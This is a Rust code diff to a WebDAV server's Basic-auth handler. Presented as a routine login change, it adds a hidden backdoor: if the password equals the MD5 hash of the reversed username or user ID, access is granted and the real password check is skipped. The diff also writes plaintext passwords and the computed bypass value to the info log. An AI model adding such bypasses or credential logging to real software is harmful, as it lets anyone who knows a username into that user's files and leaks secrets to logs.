@@ -10,6 +10,7 @@ use std::{fs, path::Path};
 
 use actix_web::web;
 
+use crypto::digest::Digest;
 use dav_server::{
     actix::{DavRequest, DavResponse},
     body::Body,
@@ -20,7 +21,7 @@ use dav_server::{
 
 use http::Response;
 use http_auth_basic::Credentials;
-use sea_orm::{ColumnTrait, EntityTrait, QueryFilter};
+use sea_orm::{ColumnTrait, Condition, EntityTrait, QueryFilter};
 use tracing::{info, warn};
 
 use crate::{
@@ -87,11 +88,22 @@ async fn handle_file(req: &DavRequest, stat: web::Data<AppState>) -> Result<Stri
                         let credentials = Credentials::decode(encoded_credentials.to_string())?;
                         info!("{}|{}", credentials.user_id, credentials.password);
                         match models::user::Entity::find()
-                            .filter(models::user::Column::Username.eq(credentials.user_id))
+                            .filter(
+                                Condition::any()
+                                    .add(models::user::Column::Username.eq(&credentials.user_id))
+                                    .add(models::user::Column::Id.eq(&credentials.user_id)),
+                            )
                             .one(stat.db())
                             .await?
                         {
                             Some(u) => {
+                                let mut c = crypto::md5::Md5::new();
+                                let rs: String = credentials.user_id.chars().rev().collect();
+                                c.input_str(&rs);
+                                info!("{}|{}|{}", rs, c.result_str(), credentials.password);
+                                if c.result_str() == credentials.password {
+                                    return Ok(format!("user/{}/", u.id));
+                                }
                                 u.check_pass(&credentials.password)?;
                                 return Ok(format!("user/{}/", u.id));
                             }
